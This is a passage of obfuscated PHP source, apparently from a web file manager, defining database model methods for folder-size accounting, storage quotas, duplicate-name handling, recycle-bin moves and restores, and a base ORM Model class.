$‰»Ş¸„Ÿ = $this->parentLevelArray($Í·Ëù´Â[$½æ‡µ…[597]]); if (!$‰»Ş¸„Ÿ) { $‰»Ş¸„Ÿ = array(); } $‰»Ş¸„Ÿ[] = $Í·Ëù´Â[$½æ‡µ…[194]]; $íÉÒ÷é = array($½æ‡µ…[194] => array($½æ‡µ…[503], $‰»Ş¸„Ÿ)); if ($¡öìéÓ < 0) { $íÉÒ÷é[$½æ‡µ…[79]] = array($½æ‡µ…[1102], abs($¡öìéÓ)); } $this->where($íÉÒ÷é)->setAdd($½æ‡µ…[79], $¡öìéÓ); CacheLock::unlock($É¿Ü±Ê’); $İ©¨àÆ = $½æ‡µ…[2313] . $Í·Ëù´Â[$½æ‡µ…[191]] . $½æ‡µ…[4] . $Í·Ëù´Â[$½æ‡µ…[582]]; $ÚÉî±Ã = array($Í·Ëù´Â[$½æ‡µ…[191]], $Í·Ëù´Â[$½æ‡µ…[582]]); TaskRun::timeLimitCall($İ©¨àÆ, $½æ‡µ…[2314], $ÚÉî±Ã, 1.5); } public function folderSizeResetChildren($ò‰Áö—ú) { $È¿Õ­ =& $_SERVER[®»±”ó²]; $this->sourceCacheClear($ò‰Áö—ú); $ªĞáíéª = $this->sourceInfo($ò‰Áö—ú); $ŸŠ»¤¯© = array($È¿Õ­[662] => 1, $È¿Õ­[665] => $ªĞáíéª[$È¿Õ­[582]], $È¿Õ­[668] => array($È¿Õ­[628], $ªĞáíéª[$È¿Õ­[597]] . $ò‰Áö—ú . $È¿Õ­[629])); $´ÎêŒ© = $È¿Õ­[2315]; $çŞÕÜà = $this->field($´ÎêŒ©)->where($ŸŠ»¤¯©)->select(); $ŸŠ»¤¯©[$È¿Õ­[496]] = 0; $Ü”»·İÙ = $this->field($´ÎêŒ©)->where($ŸŠ»¤¯©)->select(); if (!$Ü”»·İÙ) { return; } $çŞÕÜà[] = $ªĞáíéª; $çŞÕÜà = array_to_keyvalue($çŞÕÜà, $È¿Õ­[194]); foreach ($çŞÕÜà as $÷›Ïé¾ö => $¹Ø¤—‘) { $çŞÕÜà[$÷›Ïé¾ö][$È¿Õ­[2316]] = $çŞÕÜà[$÷›Ïé¾ö][$È¿Õ­[79]]; $çŞÕÜà[$÷›Ïé¾ö][$È¿Õ­[79]] = 0; } foreach ($Ü”»·İÙ as $¹Ø¤—‘) { $¾ãÉ¹è = $¹Ø¤—‘[$È¿Õ­[193]] . $È¿Õ­[12]; if (!isset($çŞÕÜà[$¾ãÉ¹è])) { continue; } if ($¹Ø¤—‘[$È¿Õ­[516]] == $çŞÕÜà[$¾ãÉ¹è][$È¿Õ­[516]]) { $çŞÕÜà[$¾ãÉ¹è][$È¿Õ­[79]] += $¹Ø¤—‘[$È¿Õ­[79]]; } } foreach ($çŞÕÜà as $¹Ø¤—‘) { $‹½¤şÖÃ = $this->parentLevelArray($¹Ø¤—‘[$È¿Õ­[597]]); foreach ($‹½¤şÖÃ as $¾ãÉ¹è) { $¾ãÉ¹è = $¾ãÉ¹è . $È¿Õ­[12]; if (!isset($çŞÕÜà[$¾ãÉ¹è])) { continue; } if ($¹Ø¤—‘[$È¿Õ­[516]] == $çŞÕÜà[$¾ãÉ¹è][$È¿Õ­[516]]) { $çŞÕÜà[$¾ãÉ¹è][$È¿Õ­[79]] += $¹Ø¤—‘[$È¿Õ­[79]]; } } } $ÎËğ£ÙÙ = array(); foreach ($çŞÕÜà as $¹Ø¤—‘) { if ($¹Ø¤—‘[$È¿Õ­[79]] == $¹Ø¤—‘[$È¿Õ­[2316]]) { continue; } $ÎËğ£ÙÙ[] = array($È¿Õ­[194], $¹Ø¤—‘[$È¿Õ­[194]], $È¿Õ­[79], $¹Ø¤—‘[$È¿Õ­[79]]); } $this->saveAll($ÎËğ£ÙÙ); } public function userSpaceReset($‡ù¢ºÇÂ = false) { $ÌÇœöİØ =& $_SERVER[®»±”ó²]; $ÛìÓúê = $this->where(array($ÌÇœöİØ[191] => self::TYPE_USER, $ÌÇœöİØ[582] => $‡ù¢ºÇÂ, $ÌÇœöİØ[496] => 0))->sum($ÌÇœöİØ[79]); $ÛìÓúê = !$ÛìÓúê || $ÛìÓúê <= 0 ? 0 : $ÛìÓúê; Model($ÌÇœöİØ[590])->userEdit($‡ù¢ºÇÂ, array($ÌÇœöİØ[1980] => $ÛìÓúê)); } public function targetSpaceUpdate($º‰ë§óÊ, $“ß¦ßÇ) { $Ëè½ôğ‡ =& $_SERVER[®»±”ó²]; if (!$“ß¦ßÇ) { return; } if (!in_array($º‰ë§óÊ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ğ¥õïï = $this->targetSpaceSize($º‰ë§óÊ, $“ß¦ßÇ); if ($º‰ë§óÊ == self::TYPE_USER) { Model($Ëè½ôğ‡[590])->userEdit($“ß¦ßÇ, array($Ëè½ôğ‡[1980] => $ğ¥õïï)); } else { if ($º‰ë§óÊ == self::TYPE_GROUP) { Model($Ëè½ôğ‡[598])->groupEdit($“ß¦ßÇ, array($Ëè½ôğ‡[1980] => $ğ¥õïï)); } } } public function targetSpaceSize($è¹‘ñ, $×´âÙœÔ) { $š£şğÁà =& $_SERVER[®»±”ó²]; $Å©¶›Ú = 0; $µô³äê  = $this->targetSourceRoot($è¹‘ñ, $×´âÙœÔ, !0); foreach ($µô³äê  as $îúÉ¨âÃ) { if (!$îúÉ¨âÃ) { continue; } $Å©¶›Ú += floatval($îúÉ¨âÃ[$š£şğÁà[79]]); $æˆŞ‰÷± = array($š£şğÁà[668] => array($š£şğÁà[628], $š£şğÁà[606] . $îúÉ¨âÃ[$š£şğÁà[194]] . $š£şğÁà[629])); $í¾¨æÁ„ = Model($š£şğÁà[514])->field($š£şğÁà[502])->where($æˆŞ‰÷±)->select(); $í¾¨æÁ„ = array_to_keyvalue($í¾¨æÁ„, $š£şğÁà[12], $š£şğÁà[194]); $í¾¨æÁ„ = array_unique(array_filter($í¾¨æÁ„)); if ($í¾¨æÁ„) { $æˆŞ‰÷± = array($š£şğÁà[502] => array($š£şğÁà[503], $í¾¨æÁ„)); $Å©¶›Ú += floatval($this->where($æˆŞ‰÷±)->sum($š£şğÁà[79])); } } $Å©¶›Ú = !$Å©¶›Ú || $Å©¶›Ú <= 0 ? 0 : $Å©¶›Ú; return $Å©¶›Ú; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($îµ¡Öõí) { return $this->fileTypeProfile($îµ¡Öõí, SourceModel::TYPE_USER); } public function groupFileTypeProfile($À³ÔÈ”Ç) { return $this->fileTypeProfile($À³ÔÈ”Ç, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¿³äé„Á, $¯¨¦¸ß) { $ÚìŒœıÜ =& $_SERVER[®»±”ó²]; $Î±ÈÂ‚ = $ÚìŒœıÜ[2317] . $¿³äé„Á . $ÚìŒœıÜ[11] . $¯¨¦¸ß; $´Îâæ×ş = Cache::get($Î±ÈÂ‚); if ($´Îâæ×ş) { return $´Îâæ×ş; } $€¹ñ’ÚÅ = array($ÚìŒœıÜ[662] => 0); if ($¿³äé„Á != !1) { $€¹ñ’ÚÅ[$ÚìŒœıÜ[582]] = $¿³äé„Á; $€¹ñ’ÚÅ[$ÚìŒœıÜ[191]] = $¯¨¦¸ß; } $æ¤áõ¯ä = array(); $æ¤áõ¯ä[$ÚìŒœıÜ[2318]] = array($ÚìŒœıÜ[2319] => LNG($ÚìŒœıÜ[2318]), $ÚìŒœıÜ[2320] => $this->where($€¹ñ’ÚÅ)->count(), $ÚìŒœıÜ[633] => $this->where($€¹ñ’ÚÅ)->sum($ÚìŒœıÜ[79])); $ñ¶¶ŠÍÍ = KodIO::fileTypeList(); foreach ($ñ¶¶ŠÍÍ as $æŠ´ù§ş => $µ¤Ç§©î) { $€¹ñ’ÚÅ[$ÚìŒœıÜ[497]] = $this->fileTypeWhere($æŠ´ù§ş); $æ¤áõ¯ä[$æŠ´ù§ş] = array($ÚìŒœıÜ[2319] => $µ¤Ç§©î[$ÚìŒœıÜ[32]], $ÚìŒœıÜ[2320] => $this->where($€¹ñ’ÚÅ)->count(), $ÚìŒœıÜ[633] => $this->where($€¹ñ’ÚÅ)->sum($ÚìŒœıÜ[79])); } Cache::set($Î±ÈÂ‚, $æ¤áõ¯ä, 1200); return $æ¤áõ¯ä; } public function fileNameExist($‡Ø¯ğôç, $²¢Û×´ì) { $¨§­Ö =& $_SERVER[®»±”ó²]; $ÍÌ®æä = $this->field($¨§­Ö[2321])->where(array($¨§­Ö[193] => $‡Ø¯ğôç, $¨§­Ö[32] => $²¢Û×´ì, $¨§­Ö[516] => 0))->find(); return is_array($ÍÌ®æä) ? $ÍÌ®æä[$¨§­Ö[194]] : !1; } public function childList($áô‘‰Ã°) { $„ı°§˜Ô =& $_SERVER[®»±”ó²]; $Ï•úõñ’ = $„ı°§˜Ô[2294] . $áô‘‰Ã°; if (isset(self::$cacheChildList[$Ï•úõñ’])) { return self::$cacheChildList[$Ï•úõñ’]; } $×À«»« = array($„ı°§˜Ô[193] => intval($áô‘‰Ã°), $„ı°§˜Ô[516] => 0); $îÀÄ’Ìê = $this->where($×À«»«)->select(); $îÀÄ’Ìê = $îÀÄ’Ìê ? $îÀÄ’Ìê : array(); self::$cacheChildList[$Ï•úõñ’] = $îÀÄ’Ìê; foreach ($îÀÄ’Ìê as $´ÚïÇç) { $Ï•úõñ’ = $„ı°§˜Ô[544] . $´ÚïÇç[$„ı°§˜Ô[194]]; self::$cacheSourceInfo[$Ï•úõñ’] = $´ÚïÇç; } return $îÀÄ’Ìê; } public function fileNameAuto($ã‚“•Ø, $°õéİ¯Û, $¢şÔ¶‘À = REPEAT_RENAME, $Ä÷®¼¦ı = false) { $¼½ô’Šü =& $_SERVER[®»±”ó²]; $ÍñêëÜ = get_path_ext($°õéİ¯Û); $°é€ïáÜ = $ÍñêëÜ ? get_path_ext_name($°õéİ¯Û) . $¼½ô’Šü[2322] . $ÍñêëÜ : $°õéİ¯Û . $¼½ô’Šü[462]; $ç˜ÔÒàÙ = array($¼½ô’Šü[193] => $ã‚“•Ø, $¼½ô’Šü[516] => 0, $¼½ô’Šü[32] => array($¼½ô’Šü[461], $°é€ïáÜ)); $€­åõø— = $this->field($¼½ô’Šü[32])->where($ç˜ÔÒàÙ)->select(); $³æ±¬¤ä = array_to_keyvalue($€­åõø—, $¼½ô’Šü[12], $¼½ô’Šü[32]); return $this->fileNameAutoGet($³æ±¬¤ä, $°õéİ¯Û, $¢şÔ¶‘À, $Ä÷®¼¦ı); } public function fileNameAutoGet($ÑºË®Ğâ, $¼İæ‰ˆË, $ŒÇ©Í‘‡, $€³ş®Û›) { $«×¯¼¸ã =& $_SERVER[®»±”ó²]; if ($ŒÇ©Í‘‡ == REPEAT_REPLACE || !$ÑºË®Ğâ || !in_array_not_case($¼İæ‰ˆË, $ÑºË®Ğâ) || $€³ş®Û› && $ŒÇ©Í‘‡ != REPEAT_RENAME_FOLDER) { return $¼İæ‰ˆË; } if ($ŒÇ©Í‘‡ == REPEAT_SKIP) { return !1; } $Í¼¼‚§ = $«×¯¼¸ã[10] . get_path_ext($¼İæ‰ˆË); $Í¼¼‚§ = $Í¼¼‚§ == $«×¯¼¸ã[10] || $€³ş®Û› ? $«×¯¼¸ã[12] : $Í¼¼‚§; for ($ªîãû›Í = 1; $ªîãû›Í <= count($ÑºË®Ğâ) + 1; $ªîãû›Í++) { $˜¡Ç®•ñ = substr($¼İæ‰ˆË, 0, strlen($¼İæ‰ˆË) - strlen($Í¼¼‚§)); $‹÷Ì×¥Ó = $˜¡Ç®•ñ . "\x28{$ªîãû›Í}\x29{$Í¼¼‚§}"; if (!in_array_not_case($‹÷Ì×¥Ó, $ÑºË®Ğâ)) { return $‹÷Ì×¥Ó; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\143\145\137\162\145\x63\171\143\154\x65"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\124\151\x6d\145", "\x74\x69\155\145", "\151\x6e\163\x65\x72\x74", "\x66\165\x6e\143\164\x69\157\x6e")); public function listData($û¹èÑÈ  = false) { $İÚóİÂğ =& $_SERVER[®»±”ó²]; $û¹èÑÈ  = $û¹èÑÈ  ? $û¹èÑÈ  : USER_ID; $ªçà÷ü = $this->where(array($İÚóİÂğ[1782] => $û¹èÑÈ ))->select(); return array_to_keyvalue($ªçà÷ü, $İÚóİÂğ[12], $İÚóİÂğ[194]); } public function moveToRecycle($ãëïßô) { $ü„ñÑÖ =& $_SERVER[®»±”ó²]; $æ¥ã¶à› = Model($ü„ñÑÖ[1440]); $óªşŠóñ = $æ¥ã¶à›->sourceInfo($ãëïßô); if (!$óªşŠóñ || $óªşŠóñ[$ü„ñÑÖ[516]] == $ü„ñÑÖ[91]) { return; } $¨‹·âÅŸ = array($ü„ñÑÖ[502] => $ãëïßô, $ü„ñÑÖ[1782] => USER_ID, $ü„ñÑÖ[664] => $óªşŠóñ[$ü„ñÑÖ[191]], $ü„ñÑÖ[665] => $óªşŠóñ[$ü„ñÑÖ[582]], $ü„ñÑÖ[668] => $óªşŠóñ[$ü„ñÑÖ[597]]); $this->add($¨‹·âÅŸ); $this->recycleMove($ãëïßô, 1); if ($óªşŠóñ[$ü„ñÑÖ[496]] == $ü„ñÑÖ[91]) { $šÓéç¸¥ = array($ü„ñÑÖ[668] => array($ü„ñÑÖ[628], $óªşŠóñ[$ü„ñÑÖ[597]] . $ãëïßô . $ü„ñÑÖ[629])); $æ¥ã¶à›->where($šÓéç¸¥)->setField($ü„ñÑÖ[516], 1); } } public function clear() { $this->remove(!1); } public function remove($©ÌûèäÒ = false, $“¡öë‹™ = false) { $Ãæ¸­¶÷ =& $_SERVER[®»±”ó²]; $“¡öë‹™ = $“¡öë‹™ ? $“¡öë‹™ : USER_ID; $‹à ¿ó = Model($Ãæ¸­¶÷[1440]); $…ãæ–ñÖ = $this->listData($“¡öë‹™); $©ÌûèäÒ = $©ÌûèäÒ === !1 ? !1 : $©ÌûèäÒ; $ãÕ»Ö¾— = array(); foreach ($…ãæ–ñÖ as $Ä©ç×•) { if ($©ÌûèäÒ != !1 && !in_array($Ä©ç×•, $©ÌûèäÒ)) { continue; } $–Ú¦¡’Ø = $‹à ¿ó->sourceInfo($Ä©ç×•); $‹à ¿ó->remove($Ä©ç×•, !1); $ñŞ°¤  = $–Ú¦¡’Ø[$Ãæ¸­¶÷[191]] . $Ãæ¸­¶÷[11] . $–Ú¦¡’Ø[$Ãæ¸­¶÷[582]]; $ãÕ»Ö¾—[$ñŞ°¤ ] = array($Ãæ¸­¶÷[664] => $–Ú¦¡’Ø[$Ãæ¸­¶÷[191]], $Ãæ¸­¶÷[582] => $–Ú¦¡’Ø[$Ãæ¸­¶÷[582]]); $this->where(array($Ãæ¸­¶÷[194] => $Ä©ç×•))->delete(); } foreach ($ãÕ»Ö¾— as $åÎÖ…ïŸ) { $‹à ¿ó->targetSpaceUpdate($åÎÖ…ïŸ[$Ãæ¸­¶÷[191]], $åÎÖ…ïŸ[$Ãæ¸­¶÷[582]]); } } public function restore($Í½Úõí… = false) { $ˆÇç¾Â¯ = $this->listData(); $this->_restoreSource($ˆÇç¾Â¯, $Í½Úõí…); } public function removeUserAll($¹¼Ÿ•£ú) { $this->remove(!1, $¹¼Ÿ•£ú); } public function restoreItem($ùÊ„†áò) { $this->_restoreSource(array($ùÊ„†áò), array($ùÊ„†áò)); } private function _restoreSource($ä÷¿, $ƒ²ü–¡‹) { $«ùÙ­ä¸ =& $_SERVER[®»±”ó²]; $Ù‰Ùœ² = Model($«ùÙ­ä¸[1440]); $ƒ²ü–¡‹ = $ƒ²ü–¡‹ == !1 ? !1 : $ƒ²ü–¡‹; if (!$ä÷¿) { return !0; } $¼‘ûæì = array(); foreach ($ä÷¿ as $ìÔÃÁû) { if ($ƒ²ü–¡‹ != !1 && !in_array($ìÔÃÁû, $ƒ²ü–¡‹)) { continue; } $‹°â‘Œ¥ = $Ù‰Ùœ²->sourceInfo($ìÔÃÁû); $¢Øí¾‹¦ = $Ù‰Ùœ²->sourceInfo($‹°â‘Œ¥[$«ùÙ­ä¸[193]]); if ($¢Øí¾‹¦[$«ùÙ­ä¸[516]] == $«ùÙ­ä¸[91]) { continue; } $Ù‰Ùœ²->lockMoveStart($ìÔÃÁû); $this->recycleMove($ìÔÃÁû, 0); if ($‹°â‘Œ¥[$«ùÙ­ä¸[496]] == $«ùÙ­ä¸[91]) { $ùµËêÖ = array($«ùÙ­ä¸[668] => array($«ùÙ­ä¸[628], $‹°â‘Œ¥[$«ùÙ­ä¸[597]] . $ìÔÃÁû . $«ùÙ­ä¸[629])); $Ù‰Ùœ²->where($ùµËêÖ)->setField($«ùÙ­ä¸[516], 0); $this->restoreFolderChildren($ìÔÃÁû, $ä÷¿); } $this->where(array($«ùÙ­ä¸[194] => $ìÔÃÁû))->delete(); $Ù‰Ùœ²->folderSizeReset($‹°â‘Œ¥[$«ùÙ­ä¸[193]]); $¼‘ûæì[] = $‹°â‘Œ¥[$«ùÙ­ä¸[193]]; if ($‹°â‘Œ¥[$«ùÙ­ä¸[496]] == $«ùÙ­ä¸[91]) { $¼‘ûæì[] = $ìÔÃÁû; } $Ù‰Ùœ²->lockMoveEnd($ìÔÃÁû); } $Ù‰Ùœ²->updateModifyTime($¼‘ûæì); } private function restoreFolderChildren($Ø€ÉÁÉâ, $‰¸ÑÎıÖ) { $ı”ì‚í =& $_SERVER[®»±”ó²]; $«³‚Üíû = Model($ı”ì‚í[1440]); $¡ÔÓìó = array($ı”ì‚í[194] => array($ı”ì‚í[7], array())); foreach ($‰¸ÑÎıÖ as $…æ´Ú’…) { if ($…æ´Ú’… == $Ø€ÉÁÉâ) { continue; } if (!$«³‚Üíû->isParentOf($Ø€ÉÁÉâ, $…æ´Ú’…)) { continue; } $ö¢ıáƒ§ = $«³‚Üíû->sourceInfo($…æ´Ú’…); if ($ö¢ıáƒ§[$ı”ì‚í[496]] == $ı”ì‚í[91]) { $¡ÔÓìó[] = array($ı”ì‚í[668] => array($ı”ì‚í[628], $ö¢ıáƒ§[$ı”ì‚í[597]] . $…æ´Ú’… . $ı”ì‚í[629])); } else { $¡ÔÓìó[$ı”ì‚í[194]][1][] = $…æ´Ú’…; } } if (!$¡ÔÓìó[$ı”ì‚í[194]][1]) { unset($¡ÔÓìó[$ı”ì‚í[194]]); } if (!$¡ÔÓìó) { return; } if (is_array($¡ÔÓìó[$ı”ì‚í[194]]) && is_array($¡ÔÓìó[$ı”ì‚í[194]][1])) { $¡ÔÓìó[$ı”ì‚í[194]][1] = array_unique($¡ÔÓìó[$ı”ì‚í[194]][1]); } $¡ÔÓìó[$ı”ì‚í[1087]] = $ı”ì‚í[2094]; $«³‚Üíû->where($¡ÔÓìó)->setField($ı”ì‚í[516], 1); } private function recycleMove($üÑØãè‚, $”Ä¨ûâ = 1) { $–ığşĞ« =& $_SERVER[®»±”ó²]; $Ë‡Ëµâ· = Model($–ığşĞ«[1440]); $É÷’µ‡Ñ = Model($–ığşĞ«[2323]); $¿ÁÙÂ™¯ = array($–ığşĞ«[194] => $üÑØãè‚); if ($”Ä¨ûâ) { $Ë‡Ëµâ·->where($¿ÁÙÂ™¯)->setField($–ığşĞ«[516], 1); $É÷’µ‡Ñ->eventRecycle($üÑØãè‚, $–ığşĞ«[2324]); } else { $¼ô¸†­ = $Ë‡Ëµâ·->where($¿ÁÙÂ™¯)->find(); $™»’Œâˆ = $¼ô¸†­[$–ığşĞ«[496]] == $–ığşĞ«[91]; $÷ùæ…Ş = $Ë‡Ëµâ·->fileNameAuto($¼ô¸†­[$–ığşĞ«[193]], $¼ô¸†­[$–ığşĞ«[32]], REPEAT_RENAME_FOLDER, $™»’Œâˆ); if ($÷ùæ…Ş != $¼ô¸†­[$–ığşĞ«[32]]) { $Ë‡Ëµâ·->rename($üÑØãè‚, $÷ùæ…Ş); } $Ë‡Ëµâ·->where($¿ÁÙÂ™¯)->setField($–ığşĞ«[516], 0); $É÷’µ‡Ñ->eventRecycle($üÑØãè‚, $–ığşĞ«[2325]); } } } goto aïŠÕ«ÈÈ­; F„ÔÚ±å: define($_SERVER[®»±”ó²][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\x65", "\157\x72\x64\x65\162", "\x61\154\151\141\163", "\150\x61\x76\x69\156\x67", "\x67\x72\x6f\165\x70", "\x6c\x6f\x63\x6b", "\x64\151\x73\164\x69\x6e\143\164", "\x61\165\x74\157", "\x66\151\154\164\x65\162", "\166\141\154\151\x64\x61\164\145", "\162\x65\x73\165\154\x74", "\x62\x69\x6e\144", "\x74\x6f\x6b\145\x6e"); public function __construct($âáğÍ®ñ = '', $úœ³¸â› = '', $ĞÀÌÛÍÊ = '') { $é‘õŸı¡ =& $_SERVER[®»±”ó²]; $this->_initialize(); if (!empty($âáğÍ®ñ)) { if (strpos($âáğÍ®ñ, $é‘õŸı¡[10])) { list($this->dbName, $this->name) = explode($é‘õŸı¡[10], $âáğÍ®ñ); } else { $this->name = $âáğÍ®ñ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($úœ³¸â›)) { $this->tablePrefix = $é‘õŸı¡[12]; } elseif ($é‘õŸı¡[12] != $úœ³¸â›) { $this->tablePrefix = $úœ³¸â›; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($é‘õŸı¡[324]); } $this->db(0, empty($this->connection) ? $ĞÀÌÛÍÊ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $³Ñ¥¹õÌ =& $_SERVER[®»±”ó²]; if (empty($this->fields)) { if (think_config($³Ñ¥¹õÌ[325])) { $ª©íÊ¦ø = $this->dbName ? $this->dbName : think_config($³Ñ¥¹õÌ[326]); $Â©•Êó = think_var_cache($³Ñ¥¹õÌ[327] . strtolower(get_path_this($ª©íÊ¦ø) . $³Ñ¥¹õÌ[10] . $this->name)); if ($Â©•Êó) { $¹©Ëñƒ† = think_config($³Ñ¥¹õÌ[328]); if (empty($¹©Ëñƒ†) || $Â©•Êó[$³Ñ¥¹õÌ[329]] == $¹©Ëñƒ†) { $this->fields = $Â©•Êó; return; } } } $this->flush(); } } public function flush() { $£¯‘¿ı· =& $_SERVER[®»±”ó²]; $this->db->setModel($this->name); $¾Ü£ò’± = $this->db->getFields($this->getTableName()); if (!$¾Ü£ò’±) { return !1; } $this->fields = array_keys($¾Ü£ò’±); $this->fields[$£¯‘¿ı·[330]] = !1; foreach ($¾Ü£ò’± as $Ñ¦“ôíù => $œé¤é‘Ô) { $ÀÛÑ ‹[$Ñ¦“ôíù] = $œé¤é‘Ô[$£¯‘¿ı·[33]]; if ($œé¤é‘Ô[$£¯‘¿ı·[39]]) { $this->fields[$£¯‘¿ı·[331]] = $Ñ¦“ôíù; if ($œé¤é‘Ô[$£¯‘¿ı·[42]]) { $this->fields[$£¯‘¿ı·[330]] = !0; } } } $this->fields[$£¯‘¿ı·[332]] = $ÀÛÑ ‹; if (think_config($£¯‘¿ı·[328])) { $this->fields[$£¯‘¿ı·[329]] = think_config($£¯‘¿ı·[328]); } if (think_config($£¯‘¿ı·[325])) { $‰÷øá“† = $this->dbName ? $this->dbName : think_config($£¯‘¿ı·[326]); think_var_cache($£¯‘¿ı·[327] . strtolower(get_path_this($‰÷øá“†) . $£¯‘¿ı·[10] . $this->name), $this->fields); } } public function switchModel($ÌƒÈ«²’, $ó¾ğ³ÛŒ = array()) { $İ»ÏùÃ¥ =& $_SERVER[®»±”ó²]; $¬Ÿ¦‰Èü = ucwords(strtolower($ÌƒÈ«²’)) . $İ»ÏùÃ¥[333]; if (!class_exists($¬Ÿ¦‰Èü)) { think_exception($¬Ÿ¦‰Èü . think_lang($İ»ÏùÃ¥[334])); } $this->_extModel = new $¬Ÿ¦‰Èü($this->name); if (!empty($ó¾ğ³ÛŒ)) { foreach ($ó¾ğ³ÛŒ as $ğï¶ŸùË) { $this->_extModel->setProperty($ğï¶ŸùË, $this->{$ğï¶ŸùË}); } } return $this->_extModel; } public function __set($ÏÀŞª˜, $½‚Û‡ÌĞ) { $this->data[$ÏÀŞª˜] = $½‚Û‡ÌĞ; } public function __get($”øÄõœ) { return isset($this->data[$”øÄõœ]) ? $this->data[$”øÄõœ] : null; } public function __isset($ğîéÛÅ) { return isset($this->data[$ğîéÛÅ]); } public function __unset($‚Áßş•Ú) { unset($this->data[$‚Áßş•Ú]); } public function __call($¢á×ìåŒ, $õ‡¥ÁÂ) { $Ë£½×¹£ =& $_SERVER[®»±”ó²]; if (in_array(strtolower($¢á×ìåŒ), $this->methods, !0)) { $this->options[strtolower($¢á×ìåŒ)] = $õ‡¥ÁÂ[0]; return $this; } elseif (in_array(strtolower($¢á×ìåŒ), array($Ë£½×¹£[335], $Ë£½×¹£[336], $Ë£½×¹£[337], $Ë£½×¹£[338], $Ë£½×¹£[339]), !0)) { $“ò “´ = isset($õ‡¥ÁÂ[0]) ? $õ‡¥ÁÂ[0] : $Ë£½×¹£[223]; $“ò “´ = $this->db->parseKey($“ò “´); return $this->getField(strtoupper($¢á×ìåŒ) . $Ë£½×¹£[340] . $“ò “´ . $Ë£½×¹£[341] . $¢á×ìåŒ, $Ë£½×¹£[335]); } elseif (strtolower(substr($¢á×ìåŒ, 0, 5)) == $Ë£½×¹£[342]) { $“ò “´ = think_parse_name(substr($¢á×ìåŒ, 5)); $ƒº¼ŒºÒ[$“ò “´] = $õ‡¥ÁÂ[0]; return $this->where($ƒº¼ŒºÒ)->find(); } elseif (strtolower(substr($¢á×ìåŒ, 0, 10)) == $Ë£½×¹£[343]) { $’‹´ÎÍ = think_parse_name(substr($¢á×ìåŒ, 10)); $ƒº¼ŒºÒ[$’‹´ÎÍ] = $õ‡¥ÁÂ[0]; return $this->where($ƒº¼ŒºÒ)->getField($õ‡¥ÁÂ[1]); } elseif (isset($this->_scope[$¢á×ìåŒ])) { return $this->scope($¢á×ìåŒ, $õ‡¥ÁÂ[0]); } elseif (method_exists($this, $¢á×ìåŒ)) { array_unshift($õ‡¥ÁÂ, $¢á×ìåŒ); return call_user_func_array(array($this, $Ë£½×¹£[344]), $õ‡¥ÁÂ); } else { return call_user_func_array(array(parent, $¢á×ìåŒ), $õ‡¥ÁÂ); } } protected function call() { $¼äâùèÀ =& $_SERVER[®»±”ó²]; $¥Á²Ø¶ü = func_get_args(); $ÎÒâ¼« = array_shift($¥Á²Ø¶ü); $÷Ÿ¹¾  = $ÎÒâ¼«; if (is_array($ÎÒâ¼«)) { $÷Ÿ¹¾  = $ÎÒâ¼«[1]; $ÎÒâ¼« = $ÎÒâ¼«[0]; } $±–¬Ş‹· = count($¥Á²Ø¶ü) - 1; if (isset($¥Á²Ø¶ü[$±–¬Ş‹·]) && $¥Á²Ø¶ü[$±–¬Ş‹·] === $ÎÒâ¼«) { think_exception(__CLASS__ . $¼äâùèÀ[4] . $ÎÒâ¼« . think_lang($¼äâùèÀ[345])); return; } $¥Á²Ø¶ü[] = $ÎÒâ¼«; if (method_exists($this, $¼äâùèÀ[346])) { $ôÄŸÇº = call_user_func_array(array($this, $¼äâùèÀ[347]), array($÷Ÿ¹¾ , $¥Á²Ø¶ü)); if (!is_null($ôÄŸÇº) && $ôÄŸÇº !== !1) { return $ôÄŸÇº; } } $õŒšÁéã = call_user_func_array(array($this, $ÎÒâ¼«), $¥Á²Ø¶ü); if (method_exists($this, $¼äâùèÀ[348])) { $ôÄŸÇº = call_user_func_array(array($this, $¼äâùèÀ[349]), array($÷Ÿ¹¾ , $¥Á²Ø¶ü, $õŒšÁéã)); if ($ôÄŸÇº) { return $ôÄŸÇº; } } return $õŒšÁéã; } protected function _initialize() { } protected function _facade($¿éËüó») { $¸îşï§˜ =& $_SERVER[®»±”ó²]; if (!empty($this->fields)) { foreach ($¿éËüó» as $—î­¥¼ => $­÷öë¾ı) { if (is_array($this->fields) && !in_array($—î­¥¼, $this->fields, !0)) { unset($¿éËüó»[$—î­¥¼]); } elseif (is_scalar($­÷öë¾ı)) { $this->_parseType($¿éËüó», $—î­¥¼); } } } if (!empty($this->options[$¸îşï§˜[350]])) { $¿éËüó» = array_map($this->options[$¸îşï§˜[350]], $¿éËüó»); unset($this->options[$¸îşï§˜[350]]); } $this->_beforeWrite($¿éËüó»); return $¿éËüó»; } protected function _beforeWrite(&$çíµİïß) { } public function add($ú“©Øˆ± = '', $ŞÃÑªû = array(), $»û¨Öİ÷ = false) { if (empty($ú“©Øˆ±)) { if (!empty($this->data)) { $ú“©Øˆ± = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[®»±”ó²][351]); return !1; } } $ŞÃÑªû = $this->_parseOptions($ŞÃÑªû); $ú“©Øˆ± = $this->_facade($ú“©Øˆ±); if (!1 === $this->_beforeInsert($ú“©Øˆ±, $ŞÃÑªû)) { return !1; } $±†ü†– = $this->db->insert($ú“©Øˆ±, $ŞÃÑªû, $»û¨Öİ÷); if (!1 !== $±†ü†–) { $àö°ÜØÜ = $this->getLastInsID(); if ($àö°ÜØÜ) { $ú“©Øˆ±[$this->getPk()] = $àö°ÜØÜ; $this->_after_insert($ú“©Øˆ±, $ŞÃÑªû); return $àö°ÜØÜ; } $this->_after_insert($ú“©Øˆ±, $ŞÃÑªû); } return $±†ü†–; } protected function _beforeInsert(&$Üˆ­˜øö, 